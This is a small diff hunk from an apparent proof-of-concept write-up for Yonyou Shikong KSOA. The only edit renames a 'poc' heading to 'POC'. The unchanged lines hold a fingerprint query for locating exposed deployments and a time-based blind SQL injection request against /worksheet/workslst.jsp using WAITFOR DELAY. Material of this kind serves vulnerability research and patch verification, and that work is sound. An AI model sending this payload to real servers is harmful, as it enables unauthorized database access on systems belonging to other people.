@@ -8,7 +8,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 ```
 GET /worksheet/workslst.jsp?id=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
 Host: [已模糊处理]
